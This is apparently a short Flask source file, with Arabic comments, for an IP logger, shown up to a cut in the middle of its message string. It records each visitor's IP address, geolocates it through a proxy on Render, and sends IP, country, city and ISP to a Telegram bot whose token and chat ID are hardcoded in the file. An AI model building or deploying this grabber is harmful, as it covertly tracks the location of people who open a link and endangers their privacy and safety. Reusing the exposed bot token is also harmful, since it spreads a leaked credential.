from flask import Flask, request
import requests
import datetime

app = Flask(__name__)

# معلومات البوت
TOKEN = "8011301271:AAEBnvieCbnWU7NAR3rv5sqr--lOqaxpSr4"
CHAT_ID = "498639695"

# رابط السيرفر الوسيط (المستضاف على Render)
PROXY_URL = "https://ip-logger-2.onrender.com/ip"

def get_ip_info(ip):
    try:
        response = requests.get(f"{PROXY_URL}?ip={ip}")
        return response.json()
    except:
        return {"query": ip, "status": "fail"}

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": text})

@app.route("/")
def index():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    info = get_ip_info(ip)
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    message = f"""[ IP LOG ]
IP: {ip}
Country: {info.get("country", "N/A")}
Region: {info.get("regionName", "N/A")}
City: {info.get("city", "N/A")}
ISP: {info.get("isp", "N/A")}
Time: {now}
